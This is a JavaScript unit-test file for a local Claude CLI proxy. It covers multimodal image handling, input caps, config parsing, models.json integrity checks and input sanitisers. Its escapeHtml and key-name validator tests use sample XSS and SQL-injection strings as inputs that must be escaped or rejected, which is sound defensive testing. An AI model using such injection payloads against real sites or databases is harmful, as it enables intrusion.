test("buildImageBlocks: multiple images in one message both emitted", () => {
  const { blocks, stats } = mmBuildImageBlocks([{ role: "user", content: [txtPart("compare"), imgPart(), imgPart()] }]);
  const imgs = blocks.filter(b => b.type === "image");
  assert.equal(imgs.length, 2);
  assert.equal(stats.imageCount, 2);
});

test("buildImageBlocks: text/image/text ordering preserved", () => {
  const { blocks } = mmBuildImageBlocks([{ role: "user", content: [txtPart("A"), imgPart(), txtPart("B")] }]);
  assert.deepEqual(blocks.map(b => (b.type === "text" ? b.text : "IMG")), ["A", "IMG", "B"]);
});

test("buildImageBlocks: image-first message keeps ordering (image before text)", () => {
  const { blocks } = mmBuildImageBlocks([{ role: "user", content: [imgPart(), txtPart("caption")] }]);
  assert.deepEqual(blocks.map(b => (b.type === "text" ? b.text : "IMG")), ["IMG", "caption"]);
});

test("buildImageBlocks: multi-turn history — role prefixes + separators preserved", () => {
  const msgs = [
    { role: "user", content: "first q" },
    { role: "assistant", content: "prior answer" },
    { role: "user", content: [txtPart("now this"), imgPart()] },
  ];
  const { blocks } = mmBuildImageBlocks(msgs);
  assert.equal(blocks[0].text, "first q");
  assert.equal(blocks[1].text, "\n\n[Assistant] prior answer");
  assert.equal(blocks[2].text, "\n\nnow this");
  assert.equal(blocks[3].type, "image");
});

test("buildImageBlocks: image in an EARLIER turn is carried (history image)", () => {
  const msgs = [
    { role: "user", content: [txtPart("here"), imgPart()] },
    { role: "assistant", content: "got it" },
    { role: "user", content: "thanks" },
  ];
  const { blocks, stats } = mmBuildImageBlocks(msgs);
  assert.equal(stats.imageCount, 1);
  assert.equal(blocks.filter(b => b.type === "image").length, 1);
});

test("buildImageBlocks: image_url as bare string is accepted (client leniency)", () => {
  const { blocks } = mmBuildImageBlocks([{ role: "user", content: [{ type: "image_url", image_url: dataUri() }] }]);
  assert.equal(blocks.find(b => b.type === "image").source.data, MM_B64);
});

test("buildStreamJsonInput: emits one newline-terminated user envelope", () => {
  const { payload } = mmBuildStreamJsonInput([{ role: "user", content: [txtPart("hi"), imgPart()] }]);
  assert.ok(payload.endsWith("\n"));
  const env = JSON.parse(payload.trim());
  assert.equal(env.type, "user");
  assert.equal(env.message.role, "user");
  assert.equal(env.message.content[1].type, "image");
});

// ── malformed / policy / oversized handling (clean 4xx, never a silent drop) ──
test("buildImageBlocks: unsupported media type → 400 unsupported_image_type", () => {
  assert.throws(
    () => mmBuildImageBlocks([{ role: "user", content: [imgPart("image/tiff")] }]),
    (e) => e instanceof MmError && e.code === "unsupported_image_type" && e.status === 400
  );
});

test("buildImageBlocks: non-base64 data URI → 400 invalid_data_uri", () => {
  assert.throws(
    () => mmBuildImageBlocks([{ role: "user", content: [{ type: "image_url", image_url: { url: "data:image/png,notbase64" } }] }]),
    (e) => e instanceof MmError && e.code === "invalid_data_uri" && e.status === 400
  );
});

test("buildImageBlocks: malformed data URI (no comma) → 400 invalid_data_uri", () => {
  assert.throws(
    () => mmBuildImageBlocks([{ role: "user", content: [{ type: "image_url", image_url: { url: "data:image/png;base64" } }] }]),
    (e) => e instanceof MmError && e.code === "invalid_data_uri"
  );
});

test("buildImageBlocks: image_url part missing a URL → 400 invalid_image_url", () => {
  assert.throws(
    () => mmBuildImageBlocks([{ role: "user", content: [{ type: "image_url", image_url: {} }] }]),
    (e) => e instanceof MmError && e.code === "invalid_image_url"
  );
});

test("buildImageBlocks: oversized single image → 413 image_too_large", () => {
  assert.throws(
    () => mmBuildImageBlocks([{ role: "user", content: [imgPart()] }], { maxImageBytes: 4 }),
    (e) => e instanceof MmError && e.code === "image_too_large" && e.status === 413
  );
});

test("buildImageBlocks: too many images → 413 too_many_images", () => {
  const many = Array.from({ length: 3 }, () => imgPart());
  assert.throws(
    () => mmBuildImageBlocks([{ role: "user", content: many }], { maxImages: 2 }),
    (e) => e instanceof MmError && e.code === "too_many_images" && e.status === 413
  );
});

test("buildImageBlocks: aggregate image bytes over cap → 413 images_too_large", () => {
  assert.throws(
    () => mmBuildImageBlocks([{ role: "user", content: [imgPart(), imgPart()] }], { maxTotalImageBytes: 100, maxImageBytes: 1000 }),
    (e) => e instanceof MmError && e.code === "images_too_large" && e.status === 413
  );
});

test("buildImageBlocks: remote http(s) URL disabled by default → 400 remote_url_disabled", () => {
  assert.throws(
    () => mmBuildImageBlocks([{ role: "user", content: [{ type: "image_url", image_url: { url: "https://example.com/a.png" } }] }]),
    (e) => e instanceof MmError && e.code === "remote_url_disabled" && e.status === 400
  );
});

test("buildImageBlocks: remote URL passthrough when allowRemoteUrl=true (url source, OCP does not fetch)", () => {
  const { blocks } = mmBuildImageBlocks(
    [{ role: "user", content: [{ type: "image_url", image_url: { url: "https://example.com/a.png" } }] }],
    { allowRemoteUrl: true }
  );
  assert.deepEqual(blocks.find(b => b.type === "image").source, { type: "url", url: "https://example.com/a.png" });
});

test("buildImageBlocks: unsupported URL scheme → 400 unsupported_url_scheme", () => {
  assert.throws(
    () => mmBuildImageBlocks([{ role: "user", content: [{ type: "image_url", image_url: { url: "ftp://x/y.png" } }] }], { allowRemoteUrl: true }),
    (e) => e instanceof MmError && e.code === "unsupported_url_scheme"
  );
});

test("buildImageBlocks: non-image parts (audio/file) fall back to placeholder text", () => {
  const { blocks } = mmBuildImageBlocks([{ role: "user", content: [txtPart("hear this"), { type: "input_audio", input_audio: {} }] }]);
  assert.deepEqual(blocks.map(b => b.text), ["hear this", "[non-text content omitted]"]);
});

test("SUPPORTED_IMAGE_TYPES: exactly the four Anthropic vision types", () => {
  assert.deepEqual([...MM_SUPPORTED].sort(), ["image/gif", "image/jpeg", "image/png", "image/webp"]);
});

test("buildImageBlocks: pure-text conversation still yields text blocks (untouched-path parity)", () => {
  // hasImageContent would be false for this input in server.mjs (text path taken),
  // but the transform must still be well-defined for a text-only turn.
  const { blocks, stats } = mmBuildImageBlocks([{ role: "user", content: "just text" }]);
  assert.deepEqual(blocks, [{ type: "text", text: "just text" }]);
  assert.equal(stats.imageCount, 0);
  assert.equal(stats.truncated, false);
});

// ── F2 (PR #154 review): text char budget is enforced on the multimodal path ──
// Regression guard: without maxTextChars, attaching one tiny image let unbounded
// text bypass MAX_PROMPT_CHARS entirely (the text path truncates; the image path
// did not). server.mjs passes maxTextChars: MAX_PROMPT_CHARS into this transform.
console.log("\nmultimodal text-budget enforcement (PR #154 F2):");

test("buildImageBlocks: text under budget → not truncated, blocks unchanged", () => {
  const { blocks, stats } = mmBuildImageBlocks(
    [{ role: "user", content: [txtPart("short"), imgPart()] }],
    { maxTextChars: 1000 }
  );
  assert.equal(stats.truncated, false);
  assert.equal(stats.textChars, "short".length);
  assert.equal(blocks.filter(b => b.type === "image").length, 1);
});

test("buildImageBlocks: text over budget → truncated, keeps most-recent tail + note", () => {
  const big = "A".repeat(300) + "TAIL_MARKER";
  const { blocks, stats } = mmBuildImageBlocks(
    [{ role: "user", content: [txtPart(big)] }],
    { maxTextChars: 50 }
  );
  assert.equal(stats.truncated, true);
  assert.equal(stats.originalTextChars, big.length);
  // The most recent characters (the tail) survive; the oldest 'A's are dropped.
  const joined = blocks.filter(b => b.type === "text").map(b => b.text).join("");
  assert.ok(joined.includes("TAIL_MARKER"), "tail text must be kept");
  assert.ok(joined.includes("truncated to fit"), "a truncation note must be present");
  assert.ok(stats.originalTextChars > stats.textChars, "post-truncation text is smaller");
});

test("buildImageBlocks: F2 exact scenario — 500k chars + one image → text bounded, image preserved", () => {
  const { blocks, stats } = mmBuildImageBlocks(
    [{ role: "user", content: [txtPart("Z".repeat(500000)), imgPart()] }],
    { maxTextChars: 150000 }
  );
  assert.equal(stats.truncated, true);
  assert.ok(stats.textChars <= 150000 + 200, "text char count is bounded by the budget (+note)");
  // The image bypasses the text budget and is NOT dropped by truncation.
  assert.equal(blocks.filter(b => b.type === "image").length, 1);
});

test("buildImageBlocks: default (no maxTextChars) never truncates — pure module standalone", () => {
  const { stats } = mmBuildImageBlocks([{ role: "user", content: [txtPart("x".repeat(10000))] }]);
  assert.equal(stats.truncated, false);
  assert.equal(stats.textChars, 10000);
});

// ── F3 (PR #154 review): fail-closed positive-int env parsing ────────────────
// A misconfigured numeric cap must NEVER silently disable a guard (`x > NaN` is
// always false) or brick the proxy with a nonsense value. parsePositiveInt keeps
// the default and reports ok:false so the caller can warn.
console.log("\nfail-closed env-cap parsing (PR #154 F3):");

test("parsePositiveInt: missing/empty → default, ok", () => {
  assert.deepEqual(parsePositiveInt(undefined, 42), { value: 42, ok: true });
  assert.deepEqual(parsePositiveInt("", 42), { value: 42, ok: true });
});

test("parsePositiveInt: valid positive integer → parsed value", () => {
  assert.equal(parsePositiveInt("5000000", 42).value, 5000000);
  assert.equal(parsePositiveInt("5000000", 42).ok, true);
});

test("parsePositiveInt: 'unlimited' → NaN rejected, default kept (would drop the cap)", () => {
  const r = parsePositiveInt("unlimited", 5 * 1024 * 1024);
  assert.equal(r.value, 5 * 1024 * 1024);
  assert.equal(r.ok, false);
});

test("parsePositiveInt: '5MB' → unit suffix rejected (naive parseInt would give 5 bytes)", () => {
  const r = parsePositiveInt("5MB", 5 * 1024 * 1024);
  assert.equal(r.value, 5 * 1024 * 1024);
  assert.equal(r.ok, false);
});

test("parsePositiveInt: '0' and '-1' → non-positive rejected", () => {
  assert.equal(parsePositiveInt("0", 20).ok, false);
  assert.equal(parsePositiveInt("0", 20).value, 20);
  assert.equal(parsePositiveInt("-1", 20).ok, false);
});

test("parsePositiveInt: '20.5' → fractional/ambiguous rejected", () => {
  assert.equal(parsePositiveInt("20.5", 20).ok, false);
});

test("parsePositiveInt: surrounding whitespace tolerated", () => {
  assert.deepEqual(parsePositiveInt("  20  ", 5), { value: 20, ok: true });
});

// ── PR #154 review round 2, gap (a): MAX_PROMPT_CHARS must fail closed like the other caps ──
// server.mjs now derives MAX_PROMPT_CHARS via parseIntEnv → parsePositiveInt (was a raw parseInt).
// CLAUDE_MAX_PROMPT_CHARS=unlimited previously → NaN → enforceTextBudget's `!(NaN > 0)` early-return
// → 500k chars passed unbounded, defeating F2's text-budget guarantee. The default must be kept.
test("parsePositiveInt: CLAUDE_MAX_PROMPT_CHARS='unlimited' → default kept, cap not lost to NaN (gap a)", () => {
  const r = parsePositiveInt("unlimited", 150000);
  assert.equal(r.ok, false);
  assert.equal(r.value, 150000, "the 150k text budget must survive a bad config, not become NaN");
});
test("parsePositiveInt: CLAUDE_MAX_PROMPT_CHARS valid override honored", () => {
  assert.deepEqual(parsePositiveInt("200000", 150000), { value: 200000, ok: true });
});

// ── messages guard predicate truth-table (issue #110) ────────────────────────
// Mirrors the guard at server.mjs line ~1650: Array.isArray(x) && x.length > 0
console.log("\nmessages guard predicate (issue #110):");

function isValidMessages(x) { return Array.isArray(x) && x.length > 0; }

test("messages guard: string 'x' → invalid (non-array)", () => {
  assert.equal(isValidMessages("x"), false);
});

test("messages guard: empty array [] → invalid", () => {
  assert.equal(isValidMessages([]), false);
});

test("messages guard: [{role:'user',content:'hi'}] → valid", () => {
  assert.equal(isValidMessages([{ role: "user", content: "hi" }]), true);
});

// ── sanitizeError helper (issue #111) ────────────────────────────────────
// Replicated verbatim from server.mjs (cannot import server.mjs).
// The SIGKILL-escalation and timer changes are process-lifecycle and are not
// unit-testable here (no live-server harness).
console.log("\nsanitizeError (issue #111):");

function sanitizeError(msg) {
  return String(msg || "Internal error").replace(/\/[\w/.\-]+/g, "[path]");
}

test("sanitizeError: strips home-dir path from message", () => {
  const result = sanitizeError("failed at /Users/foo/.claude/creds.json");
  assert.ok(result.includes("[path]"), `expected [path] in: ${result}`);
  assert.ok(!result.includes("/Users/foo"), `expected /Users/foo stripped, got: ${result}`);
});

test("sanitizeError: null input returns 'Internal error'", () => {
  assert.equal(sanitizeError(null), "Internal error");
});

test("sanitizeError: message with no path passes through unchanged", () => {
  assert.equal(sanitizeError("no path here"), "no path here");
});

test("sanitizeError: multiple paths all stripped", () => {
  const result = sanitizeError("err /a/b and /c/d");
  assert.ok(!result.includes("/a/b"), `expected /a/b stripped, got: ${result}`);
  assert.ok(!result.includes("/c/d"), `expected /c/d stripped, got: ${result}`);
  assert.ok(result.includes("[path]"), `expected [path] in: ${result}`);
});

// ── models.json SPOT wiring (issue #112) ────────────────────────────────────
// Asserts that the alias values used by server.mjs (usage probe + default model)
// match the expected IDs. A future alias rename that silently breaks these
// code paths is caught here.
import { readFileSync as spotReadFileSync } from "node:fs";
import { fileURLToPath as spotFileURLToPath } from "node:url";
import { dirname as spotDirname, join as spotJoin } from "node:path";

console.log("\nmodels.json SPOT aliases (issue #112):");

const _spotDir = spotDirname(spotFileURLToPath(import.meta.url));
const _spotModels = JSON.parse(spotReadFileSync(spotJoin(_spotDir, "models.json"), "utf8"));

test("models.json aliases.haiku === 'claude-haiku-4-5-20251001' (usage-probe SPOT)", () => {
  assert.equal(_spotModels.aliases.haiku, "claude-haiku-4-5-20251001");
});

test("models.json aliases.sonnet === 'claude-sonnet-5' (default-request-model SPOT)", () => {
  assert.equal(_spotModels.aliases.sonnet, "claude-sonnet-5");
});

test("models.json aliases.opus === 'claude-opus-5' (opus-alias SPOT)", () => {
  assert.equal(_spotModels.aliases.opus, "claude-opus-5");
});

// ── Referential integrity (PR #152 review) ──────────────────────────────────
// The value-mirror assertions above only prove the alias equals a string literal —
// they pass even if that literal points at a model that does not exist in
// models[]. A one-line slip (edit an alias, forget the models[] entry) would leave
// /v1/models missing the model while every `model: "<alias>"` request passes
// validation and then fails at CLI spawn. VALID_MODELS keys on alias *names*, so
// nothing else checks alias *targets*. This is the guard with teeth.
const _spotModelIds = new Set(_spotModels.models.map(m => m.id));

test("models.json: claude-sonnet-5 is present in models[] (the entry this PR adds)", () => {
  assert.ok(_spotModelIds.has("claude-sonnet-5"), "claude-sonnet-5 must exist as a models[].id");
});

test("models.json: claude-opus-5 is present in models[] (the entry this PR adds)", () => {
  assert.ok(_spotModelIds.has("claude-opus-5"), "claude-opus-5 must exist as a models[].id");
});

// The prompt-char budget is GLOBAL (max across every entry × 3 chars/token), not
// per-model — see lib/prompt.mjs derivePromptCharBudget. An entry declaring a native 1M
// window would therefore raise the truncation ceiling for claude-haiku-4-5 too (genuinely
// 200k), turning OCP-side truncation into an upstream API rejection.
//
// Asserts the MAX, deliberately, not every entry: ADR 0009 states the budget "scales
// automatically — no code change", so a future entry with a SMALLER window (say a 128k
// model) must stay legal and must not fail this suite. Only raising the ceiling is the
// hazard, and that is an ADR-level decision requiring per-model budgets first.
test("models.json: max contextWindow is 200000 (global prompt-budget ceiling)", () => {
  const windows = _spotModels.models.map(m => m.contextWindow);
  assert.equal(Math.max(...windows), 200000,
    `max contextWindow re-scales MAX_PROMPT_CHARS for ALL models incl. the 200k-native haiku (see lib/prompt.mjs + ADR 0009)`);
});

// contextWindow vs the CLI registry (#213). Be honest about what this buys, because it is less than
// it looks: TODAY every one of the seven rows resolves to a required value of exactly 200000, so this
// test is currently EQUIVALENT to `assert.equal(m.contextWindow, 200000)`. The table earns its place
// for two other reasons — symmetry with the reviewed _spotRegistryMaxTokens pattern below, and
// failure messages that tell the next maintainer what to do — NOT for extra detection power.
// Branch 1 only starts discriminating if a model with a registry window BELOW 200000 is ever added.
//
// It is also a FROZEN SNAPSHOT, not a live check. If Anthropic promotes claude-opus-4-6 from 200k to
// 1M in a CLI update, this table still says 200000, models.json still says 200000, branch 1 compares
// equal, and the suite stays GREEN while every message here asserts something the registry no longer
// says. This detects models.json drift only. Re-extract the table when bumping the pinned CLI.
//
// models.json UNDER-declares contextWindow for every native-1M model, and that is a DECISION, not
// drift. #195/#208 established that SPOT values should be the truth about the model, so without
// this test the four capped rows read as unfixed bugs. Why they are capped: derivePromptCharBudget
// (lib/prompt.mjs, ADR 0009) takes max(contextWindow) × 3 across ALL entries, so ONE 1e6 row would
// raise MAX_PROMPT_CHARS from 600k to 3M for EVERY model — including claude-haiku-4-5-20251001,
// which is genuinely 200k native — turning clean OCP-side truncation into upstream API rejections.
// Declaring the true 1M needs per-model budgets instead of a single global max(); tracked in #213.
//
// Values extracted id-anchored from the compiled CLI 2.1.220 registry (`grep -ao 'id:"<id>"…'` plus
// the following bytes) — never by bare-string search, which matches cross-references inside OTHER
// records. NOTE the haiku key is the models.json id; the registry record is id:"claude-haiku-4-5",
// and the dated string appears only as a provider alias — measured, under FOUR keys (first_party,
// anthropic_aws, anthropic_google_cloud, gateway) and never as an `id:` — so
// `grep 'id:"claude-haiku-4-5-20251001"'` returns 0 hits.
const _spotRegistryContextWindow = {
  "claude-opus-5": 1000000, "claude-opus-4-8": 1000000, "claude-opus-4-7": 1000000,
  "claude-opus-4-6": 200000, "claude-sonnet-5": 1000000, "claude-sonnet-4-6": 200000,
  "claude-haiku-4-5-20251001": 200000,      // registry id: claude-haiku-4-5
};
const _SPOT_CTX_CAP = 200000;

test("models.json: contextWindow equals the registry, or is the deliberate 200000 cap (#213)", () => {
  for (const m of _spotModels.models) {
    const reg = _spotRegistryContextWindow[m.id];
    assert.ok(reg !== undefined,
      `${m.id} has no recorded registry contextWindow — extract it id-anchored from the CLI binary ` +
      `(see the comment above; the haiku row shows how a models.json id can differ from the registry id) ` +
      `and add a row. Do NOT guess, and do NOT delete this assertion.`);
    if (reg <= _SPOT_CTX_CAP) {
      // PRESUMED a typo, not proven one. The model's real window fits under the cap, so there is no
      // prompt-budget reason to differ — but this PR's own schema edit records that contextWindow also
      // drives OpenClaw's compaction budget, and that budget is LINEAR in it (contextWindowTokens x
      // maxHistoryShare x SAFETY_MARGIN), which OpenClaw documents as a tuning axis. So declaring
      // BELOW the registry to compact earlier and leave more generation headroom is a coherent
      // decision. If that is what you are doing, change this row and record why — do not delete the
      // assertion. This deliberately tightens the latitude the aggregate test's comment above leaves
      // for "a future entry with a SMALLER window".
      assert.equal(m.contextWindow, reg,
        `${m.id}: registry says ${reg}, which is at or below the ${_SPOT_CTX_CAP} cap, so models.json ` +
        // JSON.stringify, not bare interpolation: a STRING "200000" would otherwise render as
        // `must match it exactly — it says 200000`, reading as a self-contradiction. assert.equal is
        // strict here (the file imports `strict as assert`), so the type is the whole defect.
        `must match it exactly — it says ${JSON.stringify(m.contextWindow)}`);
    } else {
      // Registry window exceeds the cap: the ONLY legitimate value is the cap itself. Declaring the
      // true window re-scales the global prompt budget for every other model (see above).
      // The label is DERIVED, not hardcoded: for a future 500k model a literal "(native 1M)" would be
      // a lie, and the message would then lecture about a 1M window that does not exist.
      const _regLabel = reg === 1000000 ? "native 1M" : `above the ${_SPOT_CTX_CAP} cap`;
      assert.equal(m.contextWindow, _SPOT_CTX_CAP,
        `${m.id}: registry says ${reg} (${_regLabel}), so models.json must declare exactly ` +
        `${_SPOT_CTX_CAP} — it says ${JSON.stringify(m.contextWindow)}. If you RAISED it: ` +
        `derivePromptCharBudget takes max() across ALL entries, so that re-scales the budget for the ` +
        `genuinely-200k models too, and is not a one-line change. If you LOWERED it: that may be ` +
        `deliberate OpenClaw compaction tuning — change this row and record why. See #213, ADR 0009.`);
    }
  }
  // Reverse direction. Both loops above walk models.json, so the mapping is ONE-WAY and a deleted
  // entry is simply never visited: removing claude-sonnet-4-6 leaves the suite at 463 passed, 0
  // failed (measured). It is not an alias or legacyAlias target either, so nothing else catches it —
  // the model would silently vanish from /v1/models and from OpenClaw's registry. The table already
  // enumerates the expected ids, so this costs one loop.
  // Consequence worth knowing before you hit it: forward gives models[] subset-of table and this
  // gives table subset-of models[], so the two id sets are now exactly EQUAL. Pre-recording a row
  // for a model not yet exposed is therefore a test failure — claude-fable-5 and claude-mythos-5
  // are both in the 2.1.220 registry at 1e6, and staging them here is not possible. Add the row in
  // the same commit that adds the model.
  for (const id of Object.keys(_spotRegistryContextWindow)) {
    assert.ok(_spotModelIds.has(id),
      `'${id}' is recorded in the registry table but missing from models[] — removing a model must be ` +
      `deliberate: drop its row here in the same commit and say why in the message.`);
  }
});

test("models.json: every aliases value resolves to a real models[].id (referential integrity)", () => {
  for (const [name, target] of Object.entries(_spotModels.aliases)) {
    assert.ok(_spotModelIds.has(target), `aliases.${name} -> '${target}' is a dangling alias (no matching models[].id)`);
  }
});

// maxTokens is ADVERTISED metadata, not an OCP-enforced limit (#195). OCP never reads it —
// buildCliArgs passes no output-token flag to the CLI — and OpenClaw reaches a local OCP over
// `openai-completions`, whose request field (max_completion_tokens) appears nowhere in this repo.
// It is consumed only by clients that choose to honour it, via setup.mjs / sync-openclaw.mjs /
// ocp-connect. So the invariant worth testing is simply that models.json tells the truth: each
// value must equal the model's max_output_tokens.default in the CLI registry.
//
// Pinned per model deliberately. A threshold assertion would let every entry sit at some arbitrary
// value above the bar and still call itself "registry-aligned" — which is the actual claim. Adding
// a model means adding a row here, and that is the point: the row is where you record what the
// registry said when you checked.
// Keys are models.json ids; values are the CLI 2.1.220 registry's max_output_tokens.default,
// each extracted id-anchored (grep 'id:"<id>"' + the following bytes) — never by bare-string
// search, which matches cross-references inside OTHER models' records and silently attributes
// the wrong number. ONE KEY IS NOT A REGISTRY ID: models.json carries the dated haiku id, but
// the registry record is id:"claude-haiku-4-5" — the dated string appears only as a provider
// alias, measured under FOUR keys (first_party, anthropic_aws, anthropic_google_cloud, gateway)
// and never as an `id:`. Anchor the haiku row on the SHORT id; anchoring on the dated one returns
// nothing, which is what tempts the next reader back into a bare-string search.
// UPDATE (#222): this table now has a reverse check too, mirroring _spotRegistryContextWindow
// above (see the reverse-direction loop inside the test below). Before this fix, a row left here
// for a model that no longer exists in models.json passed green — both loops walked models.json,
// so the mapping was one-way and an orphaned row was never visited. Measured on this suite pre-fix:
// rename a model, update BOTH tables for the new id, and leave the OLD id's row behind here only
// -> 633 passed, 0 failed (the wrong-repro trap — renaming without adding the new id anywhere
// fails the FORWARD check instead and masks this gap entirely; see #222 for both repros).
const _spotRegistryMaxTokens = {
  "claude-opus-5": 64000, "claude-opus-4-8": 64000, "claude-opus-4-7": 64000, "claude-opus-4-6": 64000,
  "claude-sonnet-5": 64000, "claude-sonnet-4-6": 32000,
  "claude-haiku-4-5-20251001": 32000,       // registry id: claude-haiku-4-5
};
test("models.json: every maxTokens equals the CLI registry's max_output_tokens.default (#195)", () => {
  for (const m of _spotModels.models) {
    const want = _spotRegistryMaxTokens[m.id];
    assert.ok(want !== undefined,
      `${m.id} has no recorded registry value — extract it id-anchored from the CLI binary and add a row`);
    assert.equal(m.maxTokens, want, `${m.id}: models.json says ${m.maxTokens}, CLI registry says ${want}`);
  }
  // Reverse direction (#222), mirroring _spotRegistryContextWindow's reverse check above. Both
  // loops here and above walk models.json, so without this the mapping is ONE-WAY and a
  // renamed/removed model's row is simply never visited: a rename that updates this table for
  // the new id but leaves the OLD id's row behind passed green with no reverse check (measured
  // pre-fix: 633 passed, 0 failed on this suite). The stale row isn't just untidy — this table
  // is the record of what the CLI registry said at 2.1.220, and an orphaned row is a claim about
  // a model nobody can check. Same consequence as the contextWindow table: forward gives
  // models[] subset-of table and this gives table subset-of models[], so the two id sets are now
  // exactly EQUAL — pre-recording a row for a model not yet exposed (claude-fable-5,
  // claude-mythos-5 — both present in the 2.1.220 registry) is a test failure, not prep. Add
  // the row in the same commit that adds the model.
  for (const id of Object.keys(_spotRegistryMaxTokens)) {
    assert.ok(_spotModelIds.has(id),
      `'${id}' is recorded in the registry table but missing from models[] — removing/renaming a ` +
      `model must be deliberate: drop its row here in the same commit and say why in the message.`);
  }
});

test("models.json: every legacyAliases value resolves to a real models[].id (referential integrity)", () => {
  for (const [name, target] of Object.entries(_spotModels.legacyAliases || {})) {
    assert.ok(_spotModelIds.has(target), `legacyAliases.${name} -> '${target}' is a dangling alias (no matching models[].id)`);
  }
});

// ── models.json validates against models.schema.json (#196) ─────────────────
// models.json carried `"$schema": "./models.schema.json"` while that file had never been
// committed, so the SPOT that ADR 0003 makes canonical had no structural validation at all —
// a missing contextWindow or a typo'd openclawName would only surface downstream, in OpenClaw
// or in a truncation budget. Validated with the repo's OWN validator (lib/structured-output.mjs,
// shipped for #153) rather than a new dependency: zero deps added, and it exercises that
// validator on a second real input.
//
// The schema deliberately does NOT try to express referential integrity (alias -> models[].id);
// that is not a JSON Schema concept and is covered by the two tests directly above.
import { validateJsonSchema as _spotValidate } from "./lib/structured-output.mjs";

const _spotSchema = JSON.parse(spotReadFileSync(spotJoin(_spotDir, "models.schema.json"), "utf8"));

test("models.json: the $schema reference resolves to a committed file", () => {
  assert.equal(_spotModels.$schema, "./models.schema.json", "models.json must point at the schema");
  assert.ok(_ltExists(spotJoin(_spotDir, "models.schema.json")),
    "models.schema.json must exist — a dangling $schema is what #196 was filed for");
});

test("models.json validates against models.schema.json (strict)", () => {
  const errors = _spotValidate(_spotModels, _spotSchema, "$", true);
  assert.deepEqual(errors, [], `models.json violates its own schema:\n  ${errors.join("\n  ")}`);
});

// Three corruptions the SCHEMA structurally cannot catch, asserted directly instead of pretending
// the schema covers them: the validator has no uniqueItems, no minLength, and no minimum. Adding
// those keywords to the schema would be silently ignored (see its description), so they live here.
test("models.json: ids/names are unique, untrimmed-free, and windows are positive (not schema-expressible)", () => {
  // Uniqueness applies to all three name fields, not just id. scripts/sync-openclaw.mjs maps
  // `claude-local/<id>` -> { alias: displayName } and writes openclawName as the registry label,
  // so a duplicate in EITHER collapses two models onto one OpenClaw entry — the same defect class
  // as a duplicate id, which is why review flagged covering only id as a half-fix.
  for (const f of ["id", "displayName", "openclawName"]) {
    const vals = _spotModels.models.map(m => m[f]);
    const dupes = vals.filter((v, i) => vals.indexOf(v) !== i);
    assert.equal(new Set(vals).size, vals.length, `duplicate models[].${f}: ${[...new Set(dupes)]}`);
  }
  for (const m of _spotModels.models) {
    for (const f of ["id", "displayName", "openclawName"]) {
      assert.ok(typeof m[f] === "string" && m[f].length > 0, `${m.id}: ${f} must be a non-empty string`);
      // === trim(), not trim().length: a padded id passes a trimmed check but is handed VERBATIM
      // to `claude --model`, so " claude-opus-5" would fail upstream rather than here.
      assert.equal(m[f], m[f].trim(), `${m.id}: ${f} has leading/trailing whitespace`);
    }
    assert.ok(m.contextWindow > 0, `${m.id}: contextWindow must be positive`);
    assert.ok(m.maxTokens > 0, `${m.id}: maxTokens must be positive`);
  }
});

// Guards the guard: if the schema were vacuous (e.g. `{}` or a typo'd `properties`), the test
// above would pass on anything. Each corruption below must be caught.
test("models.schema.json actually rejects malformed entries (guard is not vacuous)", () => {
  const clone = () => JSON.parse(JSON.stringify(_spotModels));
  const cases = [
    ["missing required field", m => { delete m.models[0].contextWindow; }],
    ["wrong scalar type", m => { m.models[0].reasoning = "yes"; }],
    ["non-integer window", m => { m.models[0].contextWindow = 200000.5; }],
    ["unknown extra field", m => { m.models[0].tokensPerSecond = 42; }],
    ["alias mapped to non-string", m => { m.aliases.opus = { id: "x" }; }],
    ["empty models array", m => { m.models = []; }],
    ["wrong document version", m => { m.version = 2; }],
    ["unknown top-level key", m => { m.providers = {}; }],
  ];
  for (const [label, corrupt] of cases) {
    const bad = clone(); corrupt(bad);
    const errs = _spotValidate(bad, _spotSchema, "$", true);
    assert.ok(errs.length > 0, `schema failed to reject: ${label}`);
  }
});

// ── escapeHtml + key-name validator (issue #114) ────────────────────────────
// Replicated verbatim from dashboard.html so tests run without a browser.
function escapeHtml(s) {
  return String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}
const KEY_NAME_RE = /^[A-Za-z0-9 ._-]{1,64}$/;

console.log("\nescapeHtml (issue #114):");

test("escapeHtml: XSS payload → &lt;img not <img", () => {
  const out = escapeHtml('<img src=x onerror=alert(1)>');
  assert.ok(out.includes("&lt;img"), `expected &lt;img in: ${out}`);
  assert.ok(!out.includes("<img"), `expected no raw <img in: ${out}`);
});

test("escapeHtml: single-quote, double-quote, ampersand all escaped", () => {
  assert.equal(escapeHtml("a'b\"c&d"), "a&#39;b&quot;c&amp;d");
});

test("escapeHtml: null → empty string", () => {
  assert.equal(escapeHtml(null), "");
});

console.log("\nKey-name validator (issue #114):");

test("KEY_NAME_RE: 'wife-laptop' → valid", () => {
  assert.ok(KEY_NAME_RE.test("wife-laptop"));
});

test("KEY_NAME_RE: 'key-1700000000000' → valid", () => {
  assert.ok(KEY_NAME_RE.test("key-1700000000000"));
});

test("KEY_NAME_RE: '<script>' → invalid", () => {
  assert.ok(!KEY_NAME_RE.test("<script>"));
});

test("KEY_NAME_RE: \"a'); DROP\" → invalid", () => {
  assert.ok(!KEY_NAME_RE.test("a'); DROP"));
});

test("KEY_NAME_RE: empty string → invalid", () => {
  assert.ok(!KEY_NAME_RE.test(""));
});

test("KEY_NAME_RE: 65-char string → invalid", () => {
  assert.ok(!KEY_NAME_RE.test("x".repeat(65)));
});

// ── isLoopbackBind helper (issue #115, extracted to lib/net.mjs via #125) ──────
// Tests the imported lib/net.mjs helper — the real shared definition used by server.mjs.
console.log("\nisLoopbackBind helper (issue #115):");

test("isLoopbackBind: '127.0.0.1' → true", () => {
  assert.equal(isLoopbackBind("127.0.0.1"), true);
});
test("isLoopbackBind: '::1' → true", () => {
  assert.equal(isLoopbackBind("::1"), true);
});
test("isLoopbackBind: 'localhost' → true", () => {
  assert.equal(isLoopbackBind("localhost"), true);
});
test("isLoopbackBind: '127.0.0.5' → true (127.x.x.x range)", () => {
  assert.equal(isLoopbackBind("127.0.0.5"), true);
});
test("isLoopbackBind: '0.0.0.0' → false (any-interface)", () => {
  assert.equal(isLoopbackBind("0.0.0.0"), false);
});
test("isLoopbackBind: '192.168.1.5' → false (LAN IP)", () => {
  assert.equal(isLoopbackBind("192.168.1.5"), false);
});
test("isLoopbackBind: '::' → false (IPv6 any-interface)", () => {
  assert.equal(isLoopbackBind("::"), false);
});
